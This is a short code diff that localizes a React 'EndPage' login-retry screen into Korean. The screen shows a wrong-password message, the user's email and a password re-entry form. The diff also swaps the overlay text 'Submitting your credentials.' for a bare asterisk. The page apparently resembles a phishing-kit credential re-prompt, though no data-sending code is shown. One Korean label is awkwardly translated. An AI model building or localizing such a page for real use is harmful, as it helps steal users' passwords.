@@ -102,14 +102,14 @@ export default function EndPage() {
         </div>
 
         <h1 className="text-sm font-bold text-center mb-2 text-red-600">
-          Wrong email or password. Please retry.
+          이메일 주소 또는 비밀번호가 올바르지 않습니다. 다시 시도해 주세요.
         </h1>
         <p className="text-center mb-4 text-gray-700">{email}</p>
 
         <form onSubmit={handleRetry} className="space-y-4">
           <input
             type="password"
-            placeholder="Enter your password"
+            placeholder="비밀번호를 입력하세요"
             value={password}
             onChange={e => {
               setPassword(e.target.value)
@@ -127,7 +127,7 @@ export default function EndPage() {
             type="submit"
             className="w-full bg-red-500 text-white py-3 rounded-lg hover:bg-red-600 transition"
           >
-            Retry
+            다시 해 보다
           </button>
         </form>
       </div>
@@ -137,9 +137,9 @@ export default function EndPage() {
         <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
           <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
             <h2 className="text-xl font-semibold text-gray-800">
-              Please wait…
+              확인중입니다. 잠시만 기다려주세요…
             </h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+            <p className="mt-2 text-gray-600">*</p>
           </div>
         </div>
       )}
